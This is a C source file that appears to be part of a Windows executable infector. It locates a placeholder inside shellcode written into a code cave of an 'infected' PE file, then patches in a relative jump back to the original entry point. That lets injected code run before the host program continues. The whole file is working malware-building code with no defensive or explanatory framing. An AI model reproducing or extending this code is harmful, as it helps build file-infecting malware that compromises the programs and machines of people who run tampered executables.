#include <Windows.h>
#include "exe.h"
#include "shellcode_functions.h"

#pragma warning(disable : 4996)

#define ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER 0xBBBBBBBB
#define RELATIVE_JUMP_OPCODE 0xE9

DWORD get_relative_jump(EXE_file* infected, DWORD jump_address)
{
    int relative_jump = 0;
    // Adding the address size (jumping from end of jump instruction).
    relative_jump = jump_address + 4;

    // switch from row data to RVA.
    relative_jump = relative_jump - (DWORD)infected->mapped_handle - (DWORD)infected->infected_section->PointerToRawData + (DWORD)infected->infected_section->VirtualAddress;
    // switch to virtual address.
    relative_jump += (DWORD)infected->headers->OptionalHeader.ImageBase;
    relative_jump = (DWORD)infected->entry_address - relative_jump;
    return relative_jump;
}

LPVOID set_addrress_in_shellcode(EXE_file* infected, LPBYTE codecave_address, DWORD shellcode_size)
{

   PIMAGE_DATA_DIRECTORY relocation_directory = { 0 };
    DWORD relative_jump = 0;
    DWORD offset = 0;
    DWORD* current_call_address = NULL;
    PCHAR address_of_relative_jump = NULL;
   
    do
    {
        // modify OEP address offset
        current_call_address = (PCHAR)codecave_address + offset;
        if (*current_call_address == ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER) {

            address_of_relative_jump = (PCHAR)current_call_address - 1;
            *address_of_relative_jump = RELATIVE_JUMP_OPCODE;
            // insert address of entry point
            relative_jump = get_relative_jump(infected, (DWORD)current_call_address);
            *current_call_address = relative_jump;
            break;
        }
        offset++;
    } while (offset < shellcode_size);

    return NULL;
}
